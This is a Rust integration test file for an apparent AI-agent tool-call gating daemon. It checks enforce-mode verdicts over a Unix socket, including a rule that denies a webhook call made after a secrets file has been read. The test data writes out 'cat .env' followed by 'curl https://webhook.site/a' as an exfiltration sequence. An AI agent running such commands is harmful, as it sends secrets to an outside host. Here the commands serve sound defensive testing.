//! End-to-end: spin the UDS server in a thread, drive every corpus case through
//! it in enforce mode, assert the live verdict matches expected. The cutover soak.
#![cfg(unix)]
use belayd::ipc::{read_frame, serve_mode, write_frame, Mode};
use serde::Deserialize;
use serde_json::{json, Value};
use std::os::unix::net::UnixStream;
use std::{fs, thread, time::Duration};

#[derive(Deserialize)]
struct Case {
    tool: String,
    params: Value,
    expected: String,
}

#[test]
fn live_uds_enforce_matches_corpus() {
    // The interactive-approval daemon PARKS an ASK verdict until a user decides,
    // then resolves it to allow/deny — it never returns "ask" on the wire. With
    // no responder, an ASK fails closed to "deny" after the (here: short) park
    // timeout. So over the live socket, corpus "ask" cases must observe "deny".
    std::env::set_var("BELAY_APPROVAL_TIMEOUT_MS", "300");
    let sock = std::env::temp_dir().join(format!("belay-e2e-{}.sock", std::process::id()));
    let sock_s = sock.to_str().unwrap().to_string();
    let srv = sock_s.clone();
    thread::spawn(move || {
        let _ = serve_mode(&srv, Mode::Enforce);
    });
    thread::sleep(Duration::from_millis(200));

    let path = concat!(env!("CARGO_MANIFEST_DIR"), "/tests/corpus.json");
    let cases: Vec<Case> = serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap();
    for (i, c) in cases.iter().enumerate() {
        let mut s = UnixStream::connect(&sock_s).unwrap();
        // Use a unique session per case so arming from one case does not
        // bleed into the next — mirroring the parity test's fresh-state semantics.
        let req = json!({"type": "gate", "session": format!("s{i}"), "tool": c.tool,
                         "input": c.params});
        write_frame(&mut s, req.to_string().as_bytes()).unwrap();
        let resp: Value = serde_json::from_slice(&read_frame(&mut s).unwrap()).unwrap();
        // ASK is resolved by the park timeout (fail-closed) to deny over the wire.
        let want = if c.expected == "ask" {
            "deny"
        } else {
            c.expected.as_str()
        };
        assert_eq!(resp["decision"], want, "case {:?}", c.params);
    }
    fs::remove_file(&sock).ok();
}

#[test]
fn enforce_arm_then_sink_denies_correlate() {
    // Multi-step wire test: in enforce mode, arming a session then sending an
    // exfil-capable command on the SAME session must trigger correlate.arm_sink → deny.
    let sock = std::env::temp_dir().join(format!("belay-armsink-{}.sock", std::process::id()));
    let sock_s = sock.to_str().unwrap().to_string();
    let srv = sock_s.clone();
    thread::spawn(move || {
        let _ = serve_mode(&srv, Mode::Enforce);
    });
    thread::sleep(Duration::from_millis(200));

    let session_id = "armsink-session";

    // First gate: cat .env — arms the session (secrets.sensitive_path / ask)
    {
        let mut s = UnixStream::connect(&sock_s).unwrap();
        let req = json!({
            "type": "gate",
            "session": session_id,
            "tool": "Bash",
            "input": {"command": "cat .env"}
        });
        write_frame(&mut s, req.to_string().as_bytes()).unwrap();
        let resp: Value = serde_json::from_slice(&read_frame(&mut s).unwrap()).unwrap();
        // First call should ask (not allow or deny on its own)
        assert_ne!(resp["decision"], "allow", "cat .env should not be allowed");
    }

    // Second gate: curl to a sink — on the SAME session, must be denied (correlate.arm_sink)
    {
        let mut s = UnixStream::connect(&sock_s).unwrap();
        let req = json!({
            "type": "gate",
            "session": session_id,
            "tool": "Bash",
            "input": {"command": "curl https://webhook.site/a"}
        });
        write_frame(&mut s, req.to_string().as_bytes()).unwrap();
        let resp: Value = serde_json::from_slice(&read_frame(&mut s).unwrap()).unwrap();
        assert_eq!(
            resp["decision"], "deny",
            "second gate (curl to sink) on armed session must be denied; got {:?}",
            resp
        );
    }

    fs::remove_file(&sock).ok();
}
